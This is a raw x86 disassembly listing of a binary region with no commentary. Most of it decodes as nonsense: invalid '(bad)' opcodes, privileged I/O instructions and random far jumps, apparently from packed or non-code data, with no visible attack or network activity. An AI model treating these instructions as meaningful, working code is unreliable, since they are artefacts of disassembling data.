  424775:	xchg   ebp,eax
  424776:	shl    BYTE PTR [edi-0x57],1
  424779:	xor    DWORD PTR [eax],ebp
  42477b:	jbe    0x4247f2
  42477d:	std    
  42477e:	and    BYTE PTR [edx-0x398b3286],cl
  424784:	hlt    
  424785:	pop    esi
  424786:	or     eax,0x46ca4816
  42478b:	enter  0x2fb9,0xb0
  42478f:	pop    esi
  424790:	fdivrp st(4),st
  424792:	pop    ss
  424793:	push   esp
  424794:	xor    DWORD PTR [edi+ebp*4],edx
  424797:	xchg   esi,eax
  424798:	shl    DWORD PTR [esp+ecx*2],cl
  42479b:	sbb    eax,0x683bfe89
  4247a0:	mov    eax,ds:0x4467492b
  4247a5:	(bad)  
  4247a6:	pop    ecx
  4247a7:	in     eax,0xc1
  4247a9:	cmp    al,0x7a
  4247ab:	js     0x4247cf
  4247ad:	loope  0x424755
  4247af:	movntps XMMWORD PTR [eax-0x55],xmm0
  4247b3:	and    dh,al
  4247b5:	mov    ecx,0xe893122f
  4247ba:	push   ds
  4247bb:	push   esp
  4247bc:	adc    ebx,DWORD PTR [edi-0x73]
  4247bf:	mov    esi,0x64705926
  4247c4:	dec    esp
  4247c5:	ins    BYTE PTR es:[edi],dx
  4247c6:	(bad)  
  4247c7:	out    dx,al
  4247c8:	rcl    DWORD PTR [edi*2+0x4bd87748],cl
  4247cf:	cmp    ch,BYTE PTR [ecx]
  4247d1:	data16 jle 0x4247de
  4247d4:	inc    edx
  4247d5:	jbe    0x424815
  4247d7:	scas   eax,DWORD PTR es:[edi]
  4247d8:	loop   0x424796
  4247da:	clc    
  4247db:	bnd jl 0x42477b
  4247de:	ins    DWORD PTR es:[edi],dx
  4247df:	ldmxcsr DWORD PTR [ebx+eiz*8+0x26010454]
  4247e7:	xchg   ebp,eax
  4247e8:	jge    0x424825
  4247ea:	sub    al,0xb5
  4247ec:	popf   
  4247ed:	in     al,dx
  4247ee:	push   0xffffffa4
  4247f0:	(bad)  
  4247f1:	cmp    eax,0x68264849
  4247f6:	pop    es
  4247f7:	and    BYTE PTR [ebp-0x5181b48a],bl
  4247fd:	pop    edi
  4247fe:	adc    DWORD PTR [edx-0x76],eax
  424801:	in     al,dx
  424802:	xchg   ecx,eax
  424803:	mov    ebx,0xdbde4869
  424808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424809:	push   eax
  42480a:	gs aaa 
  42480c:	out    dx,al
  42480d:	arpl   WORD PTR [esi-0x1e],si
  424810:	sub    DWORD PTR [esi-0x50cd38c4],ebx
  424816:	jl     0x4247e8
  424818:	bound  ecx,QWORD PTR [ebx+ebx*1-0x67]
  42481c:	and    DWORD PTR [ebx+0x54d41f4a],eax
  424822:	outs   dx,DWORD PTR ds:[esi]
  424823:	xchg   esp,ebp
  424825:	push   edx
  424826:	jbe    0x42485f
  424828:	mov    al,0x6e
  42482a:	test   eax,0xaaf465fd
  42482f:	sub    BYTE PTR [esi+esi*8-0x62bccfa3],0xa8
  424837:	stos   BYTE PTR es:[edi],al
  424838:	jo     0x42484e
  42483a:	push   edx
  42483b:	aam    0x9
  42483d:	sti    
  42483e:	sub    eax,0x25e8c3
	...
  4248b3:	add    BYTE PTR [edx-0x770e5c],cl
  4248b9:	(bad)  
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x424906
  4248c1:	dec    edx
  4248c2:	mov    bl,0x22
  4248c4:	push   es
  4248c5:	xchg   BYTE PTR [ecx],al
  4248c7:	add    dh,dh
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    BYTE PTR [edx-0x66a763ab],cl
  4248d1:	lock xor BYTE PTR [ecx+ecx*2+0x5],ch
  4248d6:	outs   dx,BYTE PTR ds:[esi]
  4248d7:	and    edi,DWORD PTR [edi+0x538cfa3f]
  4248dd:	icebp  
  4248de:	mov    ds:0x3032743d,eax
  4248e3:	mov    dh,0x39
  4248e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248e6:	push   ecx
  4248e7:	repz in eax,dx
  4248e9:	pop    eax
  4248ea:	loope  0x424928
  4248ec:	jle    0x424950
  4248ee:	daa    
  4248ef:	repz xor eax,0x10c75aeb
  4248f5:	xchg   esp,eax
  4248f6:	lods   eax,DWORD PTR ds:[esi]
  4248f7:	lods   al,BYTE PTR ds:[esi]
  4248f8:	or     BYTE PTR [eax+0x289764be],dh
  4248fe:	and    edx,ecx
  424900:	xor    BYTE PTR [edi+0x1f],0x97
  424904:	mov    eax,0x87bcea57
  424909:	jns    0x424902
  42490b:	or     al,0x77
  42490d:	cli    
  42490e:	add    eax,DWORD PTR [ebp+ecx*8-0x52439340]
  424915:	shr    DWORD PTR [edi-0x550690be],0x3
  42491c:	sti    
  42491d:	leave  
  42491e:	in     al,dx
  42491f:	mov    ah,dh
  424921:	push   ebp
  424922:	mov    es,edx
  424924:	in     eax,dx
  424925:	and    al,0x29
  424927:	inc    esi
  424928:	test   al,0x29
  42492a:	icebp  
  42492b:	lods   eax,DWORD PTR ds:[esi]
  42492c:	jnp    0x424916
  42492e:	outs   dx,BYTE PTR ds:[esi]
  42492f:	fs (bad) 
  424932:	ret    
  424933:	and    bl,BYTE PTR [eax-0xd83ff43]
  424939:	addr16 pop ss
  42493b:	repz xor BYTE PTR [ebp+0x78],cl
  42493f:	es (bad) 
  424941:	and    al,0xa0
  424943:	mov    edx,0x330c5f1
  424948:	out    dx,al
  424949:	sbb    DWORD PTR [edx],esp
  42494b:	dec    eax
  42494c:	adc    DWORD PTR [ebp+0x19c3cf46],edx
  424952:	ror    BYTE PTR [eax],cl
  424954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424955:	mov    ds:0xdbce286f,al
  42495a:	dec    ebx
  42495b:	imul   esp,ebp,0xffffff92
  42495e:	cmp    ah,ch
  424960:	daa    
  424961:	mov    al,0xce
  424963:	mov    cl,0x46
  424965:	frstor gs:[ecx+0x1b]
  424969:	push   ds
  42496a:	dec    esi
  42496b:	lods   al,BYTE PTR ds:[esi]
  42496c:	js     0x424928
  42496e:	mov    eax,0x8cc57d6
  424973:	out    dx,al
  424974:	in     al,0xf1
  424976:	sub    DWORD PTR [ecx],ecx
  424978:	fs mov esp,0x279c333c
  42497e:	aas    
  42497f:	cmp    bh,bl
  424981:	mov    BYTE PTR [ecx+edi*8+0x62],ah
  424985:	push   ecx
  424986:	xchg   DWORD PTR [ebx+eiz*4+0x5d],edx
  42498a:	repz jne 0x4249db
  42498d:	inc    esp
  42498e:	call   DWORD PTR [ebp+0x57991b90]
  424994:	cmp    al,0x43
  424996:	xchg   esp,eax
  424997:	enter  0x692,0x25
  42499b:	popf   
  42499c:	mov    ds:0x9e405e96,al
  4249a1:	in     eax,dx
  4249a2:	and    eax,0x89ed820e
  4249a7:	stc    
  4249a8:	jmp    DWORD PTR [esi]
  4249aa:	xchg   ebx,eax
  4249ab:	jecxz  0x424a08
  4249ad:	mov    ch,0x9e
  4249af:	xor    al,0x15
  4249b1:	and    BYTE PTR [eax],al
  4249b3:	push   es
  4249b4:	imul   edi,DWORD PTR [esi],0xfffffff6
  4249b7:	idiv   BYTE PTR [eax+0x3b]
  4249ba:	fistp  QWORD PTR [ecx]
  4249bc:	mov    bl,0xd2
  4249be:	not    DWORD PTR [eax+0x42]
  4249c1:	adc    al,0x0
	...
  424a33:	add    BYTE PTR [eax],dh
  424a35:	cmp    eax,0xdf7d9f75
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	sahf   
  424a41:	adc    edi,esi
  424a43:	icebp  
  424a44:	cld    
  424a45:	xchg   BYTE PTR [ecx],al
  424a47:	add    dh,dh
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    BYTE PTR [ebx],bh
  424a4d:	popa   
  424a4e:	add    BYTE PTR [edi+0x43ab8b8d],cl
  424a54:	leave  
  424a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a56:	pushf  
  424a57:	and    DWORD PTR [eax],edx
  424a59:	cld    
  424a5a:	adc    al,0xa3
  424a5c:	push   ss
  424a5d:	or     BYTE PTR [edx+ebx*1-0x3e],0xb9
  424a62:	xchg   DWORD PTR [edi],ecx
  424a64:	mov    ds:0xc235fc4e,al
  424a69:	call   0xef6f:0xd0ed5cf5
  424a70:	mov    DWORD PTR [edx],edx
  424a72:	inc    ebp
  424a73:	popf   
  424a74:	adc    edx,DWORD PTR ds:[eax+0x12]
  424a78:	mov    eax,0xb2ed8a3
  424a7d:	mov    eax,ds:0xf514e7c2
  424a82:	out    dx,al
  424a83:	loopne 0x424ab0
  424a85:	inc    eax
  424a86:	xor    ecx,edi
  424a88:	push   cs
  424a89:	sbb    edx,DWORD PTR [ecx+edi*2+0x21543b65]
  424a90:	xchg   BYTE PTR [ebx+0x4f],bl
  424a93:	push   ecx
  424a94:	imul   eax,DWORD PTR [ebx-0x26a7110],0xa5bbefd3
  424a9e:	cld    
  424a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424aa0:	dec    ebp
  424aa1:	pop    esp
  424aa2:	dec    esi
  424aa3:	jns    0x424ad0
  424aa5:	das    
  424aa6:	shr    DWORD PTR [ecx],0x3a
  424aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424aaa:	adc    eax,0x14c0ceb
  424aaf:	jmp    0x1859f48a
  424ab4:	dec    ebx
  424ab5:	xchg   edi,eax
  424ab6:	push   esi
  424ab7:	xor    al,0xc7
  424ab9:	in     al,0x3
  424abb:	mov    eax,ds:0x6b29c89e
  424ac0:	stos   DWORD PTR es:[edi],eax
  424ac1:	xchg   ecx,eax
  424ac2:	or     edi,DWORD PTR [ebp-0x67bece65]
  424ac8:	popa   
  424ac9:	or     ah,BYTE PTR [ebx-0x7c]
  424acc:	adc    eax,0x400cc14
  424ad1:	cmp    DWORD PTR ds:0x3c0ec4e7,ecx
  424ad7:	call   0xc13caeb8
  424adc:	fs (bad) 
  424ade:	mov    ch,0xfe
  424ae0:	call   0x78c4927a
  424ae5:	jno    0x424ad1
  424ae7:	sbb    DWORD PTR [ebx+0x46],eax
  424aea:	xor    ebx,esp
  424aec:	ins    DWORD PTR es:[edi],dx
  424aed:	sbb    BYTE PTR [edi+0x291c1c83],dl
  424af3:	push   eax
  424af4:	js     0x424b45
  424af6:	mov    al,ds:0x8277875a
  424afb:	sub    DWORD PTR [ebp-0xf0d5da5],0xffffffe3
  424b02:	lahf   
  424b03:	xchg   DWORD PTR [eax],ebp
  424b05:	stos   DWORD PTR es:[edi],eax
  424b06:	mov    ecx,0xfeda6b57
  424b0b:	push   cs
  424b0c:	inc    esp
  424b0d:	sub    ecx,DWORD PTR [edi+0x1c]
  424b10:	retf   
  424b11:	xchg   ebp,eax
  424b12:	adc    edx,DWORD PTR [esi]
  424b14:	adc    DWORD PTR [ebp+eiz*1-0x21],ecx
  424b18:	(bad)  
  424b19:	bound  ebx,QWORD PTR [esi]
  424b1b:	mov    esp,0x955f6a88
  424b20:	mov    ebp,0x6bf6661d
  424b25:	addr16 and esi,ecx
  424b28:	lahf   
  424b29:	adc    DWORD PTR [eax+edi*2+0x70],esp
  424b2d:	out    0x91,al
  424b2f:	pop    edx
  424b30:	dec    esp
  424b31:	fs mov ecx,ebp
  424b34:	inc    eax
  424b35:	mov    ebp,0x3794750c
  424b3a:	test   bl,0x51
  424b3d:	pusha  
  424b3e:	xor    DWORD PTR [eax-0x63],eax
  424b41:	or     DWORD PTR [eax],eax
	...
  424bb3:	add    ch,bh
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx-0x6eb9f881]
  424bc1:	dec    ebp
  424bc2:	and    eax,0x187f2c8
  424bc7:	add    dh,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    al,dl
  424bcd:	(bad)  
  424bce:	fist   DWORD PTR [edi]
  424bd0:	xor    BYTE PTR [ecx+0x53],dh
  424bd3:	aad    0x32
  424bd5:	jge    0x424c44
  424bd7:	enter  0x817b,0x1a
  424bdb:	mov    ch,0x4e
  424bdd:	fcomp  QWORD PTR [edx+esi*8-0x4f]
  424be1:	ret    0xe23d
  424be4:	inc    ebp
  424be5:	int3   
  424be6:	inc    ebp
  424be7:	push   eax
  424be8:	push   ebx
  424be9:	data16 or BYTE PTR [ebx-0x49],bh
  424bed:	and    al,0xc0
  424bef:	mov    ch,0x20
  424bf1:	mov    ds:0xfa0633d2,al
  424bf6:	adc    al,0x40
  424bf8:	and    ebx,edi
  424bfa:	xchg   esi,eax
  424bfb:	inc    bx
  424bfd:	inc    edi
  424bfe:	xor    al,0x40
  424c00:	pop    esp
  424c01:	push   ebx
  424c02:	cwde   
  424c03:	pop    esi
  424c04:	shl    DWORD PTR [ebp+0x6a],1
  424c07:	dec    eax
  424c08:	pop    esp
  424c09:	pop    ds
  424c0a:	ja     0x424c7a
  424c0c:	push   ds
  424c0d:	ret    
  424c0e:	jno    0x424c59
  424c10:	add    BYTE PTR [ecx-0x7716e216],ch
  424c16:	dec    edi
  424c17:	push   ecx
  424c18:	sub    al,0xa1
  424c1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c1b:	mov    ?,esi
  424c1d:	xchg   ebp,edi
  424c1f:	stos   DWORD PTR es:[edi],eax
  424c20:	cli    
  424c21:	pop    ebp
  424c22:	mul    BYTE PTR [edx]
  424c24:	stos   DWORD PTR es:[edi],eax
  424c25:	nop
  424c26:	mov    edx,DWORD PTR [ebx]
  424c28:	stos   BYTE PTR es:[edi],al
  424c29:	mov    ebp,0x26c5f25f
  424c2e:	cmp    dl,bl
  424c30:	mov    BYTE PTR ds:0x1f97a773,ah
  424c36:	cmp    ebx,DWORD PTR [edi]
  424c38:	jae    0x424c9f
  424c3a:	scas   al,BYTE PTR es:[edi]
  424c3b:	push   edi
  424c3c:	in     eax,0xd9
  424c3e:	daa    
  424c3f:	pusha  
  424c40:	xor    ah,BYTE PTR [edi-0x11]
  424c43:	(bad)  
  424c44:	fadd   QWORD PTR [ebx-0x19428c7c]
  424c4a:	out    0x4,eax
  424c4c:	cmp    DWORD PTR [esi+eiz*2],edx
  424c4f:	xchg   ebp,eax
  424c50:	lea    esi,[edx+0x3e3cd3db]
  424c56:	icebp  
  424c57:	test   BYTE PTR [eax-0x1f54dc08],dl
  424c5d:	cmp    BYTE PTR [esi+0x78],bl
  424c60:	fisubr DWORD PTR [ebx-0x21]
  424c63:	dec    eax
  424c64:	sbb    BYTE PTR [edx+0x6a],ah
  424c67:	out    0xb7,al
  424c69:	push   DWORD PTR [esi]
  424c6b:	push   edx
  424c6c:	push   ebx
  424c6d:	mov    dl,0xad
  424c6f:	mov    cl,0xa3
  424c71:	inc    ebx
  424c72:	lahf   
  424c73:	cmc    
  424c74:	add    ebx,edi
  424c76:	jmp    0x7b4a:0x997dd556
  424c7d:	ret    0x4e8e
  424c80:	lds    ebx,FWORD PTR [edx]
  424c82:	shl    BYTE PTR [edi-0x55c5b798],1
  424c88:	fst    QWORD PTR [esi]
  424c8a:	(bad)  
  424c8b:	mov    ds:0x347bfe4a,al
  424c90:	dec    esp
  424c91:	mov    WORD PTR [edx],ss
  424c93:	retf   0x2655
  424c96:	sbb    bl,dl
  424c98:	dec    esi
  424c99:	aad    0xfe
  424c9b:	or     al,0xf1
  424c9d:	clc    
  424c9e:	lahf   
  424c9f:	cli    
  424ca0:	push   es
  424ca1:	std    
  424ca2:	ss inc ecx
  424ca4:	neg    DWORD PTR [edx+0x3d2710e4]
  424caa:	mov    dl,0xe6
  424cac:	in     al,0x89
  424cae:	cmp    eax,0x152ddd1
  424cb3:	jg     0x424cbd
  424cb5:	sbb    BYTE PTR [ebx+0x3d],0x59
  424cb9:	aaa    
  424cba:	mov    ds:0xa29fa1e3,eax
  424cbf:	pushf  
  424cc0:	fldenv [eax+eax*1]
	...
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4+0x408194d7]
  424d42:	cmp    eax,0x188e8fe
  424d47:	add    dh,dh
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [edi+0x18],al
  424d4e:	popf   
  424d4f:	xor    BYTE PTR [edx-0x7e],al
  424d52:	xor    bh,bh
  424d54:	ror    dh,0x4c
  424d57:	cli    
  424d58:	sub    BYTE PTR [eax-0x7],bh
  424d5b:	jle    0x424d68
  424d5d:	and    edx,ebx
  424d5f:	in     al,0x3e
  424d61:	cmp    eax,edx
  424d63:	mov    dh,0x50
  424d65:	sbb    ebp,DWORD PTR [esi-0x490abdad]
  424d6b:	pop    ecx
  424d6c:	shl    DWORD PTR [eax+0x5b72d0b4],1
  424d72:	jae    0x424dad
  424d74:	sub    DWORD PTR [ebp-0x24],eax
  424d77:	mov    ds:0x6178b867,eax
  424d7c:	clc    
  424d7d:	jp     0x424d52
  424d7f:	jmp    0x424d74
  424d81:	iret   
  424d82:	cmp    BYTE PTR [edx],bh
  424d84:	aas    
  424d85:	dec    edx
  424d86:	pop    edi
  424d87:	jno    0x424d64
  424d89:	es inc edx
  424d8b:	xor    esi,edx
  424d8d:	ss mov eax,0x4a68ddcc
  424d93:	jl     0x424dd0
  424d95:	jge    0x424da7
  424d97:	(bad)  
  424d98:	repnz mov dl,0xd4
  424d9b:	pop    eax
  424d9c:	and    al,0x19
  424d9e:	mov    cl,0x52
  424da0:	sub    BYTE PTR [ebx],ah
  424da2:	jle    0x424de1
  424da4:	xor    DWORD PTR [edx+0x4efbc586],esi
  424daa:	rol    BYTE PTR [eax],cl
  424dac:	mov    eax,0xe6dbaa20
  424db1:	jo     0x424d8c
  424db3:	xor    ch,BYTE PTR [esp+ebp*2-0xe25c5fb]
  424dba:	not    BYTE PTR [esi]
  424dbc:	cmp    esp,DWORD PTR [esi]
  424dbe:	outs   dx,DWORD PTR ds:[esi]
  424dbf:	lahf   
  424dc0:	shl    DWORD PTR [ebx],0x57
  424dc3:	(bad)  
  424dc4:	cmp    DWORD PTR [ebp+eax*4+0x1c],edx
  424dc8:	mov    dl,0x44
  424dca:	popf   
  424dcb:	aad    0x58
  424dcd:	or     dh,dh
  424dcf:	lock test BYTE PTR [eax+0x43],dh
  424dd3:	sbb    eax,DWORD PTR [eax]
  424dd5:	dec    edi
  424dd6:	mov    ch,0xd1
  424dd8:	pop    edi
  424dd9:	inc    edx
  424dda:	push   cs
  424ddb:	or     BYTE PTR [esi+edx*4],0x64
  424ddf:	push   0x1a
  424de1:	scas   eax,DWORD PTR es:[edi]
  424de2:	jbe    0x424db0
  424de4:	aas    
  424de5:	data16 adc al,0x33
  424de8:	hlt    
  424de9:	mov    ch,0x8d
  424deb:	imul   ebp,ecx,0xffffff8f
  424dee:	(bad)  
  424def:	ss jo  0x424d7a
  424df2:	pop    edi
  424df3:	or     al,BYTE PTR [eax]
  424df5:	into   
  424df6:	stc    
  424df7:	jp     0x424e3a
  424df9:	push   cs
  424dfa:	or     BYTE PTR [ebx-0x1aa60a7c],dl
  424e00:	mov    ebx,0x3c2e08b5
  424e05:	cmp    ecx,ebp
  424e07:	add    esp,DWORD PTR [eax]
  424e09:	push   esi
  424e0a:	popa   
  424e0b:	cmp    DWORD PTR [edi],ebp
  424e0d:	or     ebp,DWORD PTR [esi+0x49]
  424e10:	lea    ebp,ds:0xfcdb073f
  424e16:	mov    cl,0x4c
  424e18:	mov    eax,0x391bd861
  424e1d:	ret    0xaa29
  424e20:	in     al,dx
  424e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e22:	mov    ah,0xaa
  424e24:	add    ebx,DWORD PTR [edi+0x7420f14f]
  424e2a:	outs   dx,DWORD PTR ds:[esi]
  424e2b:	repz push 0x3878bd0e
  424e31:	fld    QWORD PTR [bp+si+0x22]
  424e35:	cdq    
  424e36:	jno    0x424dfb
  424e38:	test   DWORD PTR [ebp-0x4d0ea5ff],ebx
  424e3e:	mov    DWORD PTR [eax],ebx
  424e40:	cli    
  424e41:	pop    ebx
	...
  424eb2:	add    BYTE PTR [eax],al
  424eb4:	scas   al,BYTE PTR es:[edi]
  424eb5:	call   0x9fff:0xff74b964
  424ebc:	xchg   edx,eax
  424ebd:	dec    ebp
  424ebe:	lea    edx,[edx+0x7f1346e5]
  424ec4:	fimul  WORD PTR [ecx+0xf60001]
  424eca:	add    BYTE PTR [eax],al
  424ecc:	push   edx
  424ecd:	mov    ecx,0xad329012
  424ed3:	or     bl,0x8a
  424ed6:	sub    BYTE PTR [ebx],bh
  424ed8:	xor    ebp,esi
  424eda:	dec    ebx
  424edb:	enter  0x3a82,0xc2
  424edf:	fbld   TBYTE PTR [esi]
  424ee1:	leave  
  424ee2:	pop    ebp
  424ee3:	adc    esi,edx
  424ee5:	sbb    ecx,DWORD PTR [esp+ecx*8+0x1ff3143]
  424eec:	(bad)  
  424eed:	aas    
  424eee:	loopne 0x424f31
  424ef0:	ror    BYTE PTR [edi+0x26885b32],cl
  424ef6:	sub    ah,BYTE PTR [edx-0x21]
  424ef9:	inc    esi
  424efa:	ret    0x2155
  424efd:	ja     0x424f38
  424eff:	jns    0x424f08
  424f01:	vmwrite ecx,edi
  424f04:	xor    bl,BYTE PTR [ebp+0x50f5d966]
  424f0a:	sub    ebx,DWORD PTR [esp+esi*1-0x400ffabe]
  424f11:	pop    ebp
  424f12:	out    dx,al
  424f13:	mov    bh,0xca
  424f15:	push   0xd
  424f17:	jne    0x424f35
  424f19:	(bad)  
  424f1a:	mov    ?,WORD PTR [ebx-0x2e]
  424f1d:	adc    al,0x1c
  424f1f:	cld    
  424f20:	adc    ebx,DWORD PTR [eax+0x2246a094]
  424f26:	xchg   edi,eax
  424f27:	stc    
  424f28:	xchg   esp,eax
  424f29:	and    eax,0xb6b2c3dd
  424f2e:	mov    ebx,0x384e23f5
  424f33:	xor    eax,0x63b4a81c
  424f38:	loope  0x424f51
  424f3a:	and    eax,0xbe67d8c6
  424f3f:	mov    al,0xf9
  424f41:	add    ebp,DWORD PTR [eax-0x6db15d59]
  424f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f48:	arpl   WORD PTR [edi-0x23cf97a6],dx
  424f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f4f:	addr16 lock dec esi
  424f52:	fsub   QWORD PTR [edx]
  424f54:	icebp  
  424f55:	and    bl,BYTE PTR [ecx-0x78]
  424f58:	xchg   edi,eax
  424f59:	imul   ebp,DWORD PTR [ebx-0x6bcf9a89],0xffffff82
  424f60:	neg    edx
  424f62:	jmp    0x424f3b
  424f64:	push   0x36479b8e
  424f69:	push   es
  424f6a:	lods   al,BYTE PTR ds:[esi]
  424f6b:	in     eax,0xa5
  424f6d:	enter  0x14b7,0x69
  424f71:	outs   dx,BYTE PTR ds:[esi]
  424f72:	shl    DWORD PTR [edi],cl
  424f74:	xchg   edi,eax
  424f75:	fcomp  DWORD PTR [eax-0x13]
  424f78:	daa    
  424f79:	adc    DWORD PTR [edx+ebx*8-0x7ef29593],ebp
  424f80:	pop    esi
  424f81:	shr    ecx,0x52
  424f84:	das    
  424f85:	lds    ebp,FWORD PTR [ebp+0x3f35b9c5]
  424f8b:	ret    0x8ee6
  424f8e:	hlt    
  424f8f:	push   es
  424f90:	and    BYTE PTR [edx],0xd1
  424f93:	scas   al,BYTE PTR es:[edi]
  424f94:	retf   0xd23a
  424f97:	test   al,0x62
  424f99:	fdiv   DWORD PTR [edi-0xdf72ea]
  424f9f:	lds    ecx,FWORD PTR [ecx-0x79d46031]
  424fa5:	out    dx,al
  424fa6:	sbb    al,cl
  424fa8:	mov    ebx,0x20dfc4fd
  424fad:	xchg   edx,eax
  424fae:	cmp    al,0x6f
  424fb0:	sub    eax,0x871975ce
  424fb5:	ds sbb al,0x27
  424fb8:	or     BYTE PTR [edx+0x7ada9bae],cl
  424fbe:	ret    
  424fbf:	mov    ds:0x7e7c,eax
	...
  425034:	jl     0x42508e
  425036:	cs mov cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	mov    edi,0xd449a912
  425045:	mov    al,BYTE PTR [ecx]
  425047:	add    dh,dh
  425049:	add    BYTE PTR [eax],al
  42504b:	add    ch,cl
  42504d:	mov    dh,0x20
  42504f:	cdq    
  425050:	mov    ebp,esp
  425052:	fsub   QWORD PTR [ebx-0x45]
  425055:	adc    ebx,DWORD PTR [ebp+0x22640f49]
  42505b:	pop    ebx
  42505c:	call   0x79e738c4
  425061:	std    
  425062:	push   edx
  425063:	mul    BYTE PTR [edx-0x38]
  425066:	xor    eax,0x909568e1
  42506b:	pop    ds
  42506c:	scas   eax,DWORD PTR es:[edi]
  42506d:	jmp    0x4250ab
  42506f:	(bad)  
  425070:	scas   al,BYTE PTR es:[edi]
  425071:	inc    eax
  425072:	or     DWORD PTR [ebp-0x2b],esp
  425075:	dec    esp
  425076:	xchg   di,ax
  425078:	and    eax,0x5c5ec1ba
  42507d:	(bad)  
  42507f:	lds    ecx,FWORD PTR [edx+0x105b7271]
  425085:	add    eax,0xdca6281d
  42508a:	test   al,0xc2
  42508c:	imul   ebp,DWORD PTR [edx+esi*4],0xfffffff8
  425090:	pop    edi
  425091:	xor    al,0x30
  425093:	and    al,0xf4
  425095:	iret   
  425096:	lahf   
  425097:	xchg   edx,eax
  425098:	iret   
  425099:	lods   al,BYTE PTR fs:[esi]
  42509b:	in     al,0xd6
  42509d:	ja     0x42501f
  42509f:	jge    0x425043
  4250a1:	es mov eax,0x1138dd7f
  4250a7:	mov    edi,0x3ce1181
  4250ac:	fwait
  4250ad:	iret   
  4250ae:	mov    al,ds:0x791e2093
  4250b3:	aad    0x32
  4250b5:	push   esi
  4250b6:	cmp    DWORD PTR [edx-0x1d82f650],ecx
  4250bc:	fwait
  4250bd:	retf   0x36f4
  4250c0:	outs   dx,DWORD PTR ds:[esi]
  4250c1:	lods   eax,DWORD PTR ds:[esi]
  4250c2:	or     al,0xd1
  4250c4:	add    eax,0xd12eef0e
  4250c9:	mov    ah,0x9d
  4250cb:	adc    DWORD PTR [ebx],0x31
  4250ce:	sbb    ebx,DWORD PTR [edi+esi*2-0x456c5e71]
  4250d5:	push   edx
  4250d6:	fwait
  4250d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250d8:	xor    BYTE PTR [edi-0x45ccfd0c],ah
  4250de:	dec    edx
  4250df:	in     al,0x3
  4250e1:	in     al,0x21
  4250e3:	stos   BYTE PTR es:[edi],al
  4250e4:	ret    0xf181
  4250e7:	fisubr DWORD PTR [ebp+0x1e5719a8]
  4250ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250ee:	add    BYTE PTR [eax-0x18],0xb8
  4250f2:	xor    BYTE PTR [bx+si-0x1f4b],ah
  4250f7:	ja     0x42513e
  4250f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250fa:	loopne 0x425164
  4250fc:	js     0x425101
  4250fe:	jne    0x425149
  425100:	in     eax,dx
  425101:	sbb    bl,BYTE PTR [eax+eax*2]
  425104:	adc    eax,0xffb068a
  425109:	lods   eax,DWORD PTR ds:[esi]
  42510a:	jmp    0xe049:0xfe480461
  425111:	fsubrp st(0),st
  425113:	hlt    
  425114:	pop    ss
  425115:	(bad)  
  425116:	nop
  425117:	lea    ebp,[edx]
  425119:	sbb    eax,0x321a351a
  42511e:	into   
  42511f:	jnp    0x42512e
  425121:	add    eax,0xdb640515
  425126:	add    al,0x81
  425128:	sub    al,al
  42512a:	push   esi
  42512b:	add    eax,0x8132bcc0
  425130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425131:	pop    es
  425132:	pop    ss
  425133:	xlat   BYTE PTR ds:[ebx]
  425134:	pop    ebp
  425135:	mov    al,0x9b
  425137:	adc    eax,0x69ea8693
  42513c:	push   0x51464aad
  425141:	adc    BYTE PTR [eax],al
	...
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251c1:	(bad)  
  4251c2:	fcom   st(2)
  4251c4:	retf   0x18b
  4251c7:	add    dh,dh
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    cl,cl
  4251cd:	inc    edx
  4251ce:	stc    
  4251cf:	pop    esi
  4251d0:	pop    ecx
  4251d1:	imul   ebp,DWORD PTR [edi+0x2e1147cf],0x687da495
  4251db:	sbb    BYTE PTR [ebx-0x669ea199],0x4c
  4251e2:	cwde   
  4251e3:	(bad)  
  4251e4:	mov    bl,BYTE PTR [ebx-0x27]
  4251e7:	mov    ss,edx
  4251e9:	mov    ecx,0x7de34a75
  4251ee:	pop    ebp
  4251ef:	test   eax,0x894b83eb
  4251f4:	sbb    cl,BYTE PTR [esi+0x42]
  4251f7:	pusha  
  4251f8:	mov    esp,0x23a79a53
  4251fd:	add    eax,0xd393fbb8
  425202:	loopne 0x4251e8
  425204:	inc    ebp
  425205:	dec    ebp
  425206:	shl    DWORD PTR [ecx+ebx*8-0x61459ad2],0xaf
  42520e:	dec    esi
  42520f:	test   eax,0xf34ca3e0
  425214:	sbb    DWORD PTR [ecx-0x60b29c40],edx
  42521a:	cwde   
  42521b:	push   ecx
  42521c:	cwde   
  42521d:	shr    BYTE PTR ds:[ecx],0xd4
  425221:	fisubr WORD PTR [ebx+0x16c536cf]
  425227:	cmp    al,0x53
